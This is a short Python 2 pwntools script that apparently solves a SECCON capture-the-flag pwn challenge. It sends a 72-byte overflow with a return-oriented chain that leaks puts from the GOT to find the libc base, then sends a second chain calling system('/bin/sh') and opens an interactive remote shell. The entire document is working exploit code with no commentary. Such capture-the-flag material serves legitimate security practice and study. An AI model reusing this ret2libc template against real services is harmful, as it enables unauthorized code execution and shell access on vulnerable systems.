from pwn import *

context.arch = 'amd64'
con = remote('classic.pwn.seccon.jp', 17354)

con.recvline()
con.recvregex('Local Buffer >> ')

payload = 'A' * 72
payload += pack(0x00400753)  # pop rdi
payload += pack(0x00601018)  # puts@got
payload += pack(0x00400520)  # puts@plt
payload += pack(0x004006a9)  # main

con.sendline(payload)
con.recvline()
msg = con.recvline().strip()
libc_base_addr = unpack(msg + '\x00' * 2) - 0x6f690
print "[-] libc_base_addr = 0x%x" % libc_base_addr

con.recvline()
con.recvregex('Local Buffer >> ')

payload = 'A' * 72
payload += pack(0x00400753)  # pop rdi
payload += pack(libc_base_addr + 0x18cd57)  # /bin/sh
payload += pack(libc_base_addr + 0x45390)  # system

con.sendline(payload)
con.interactive()
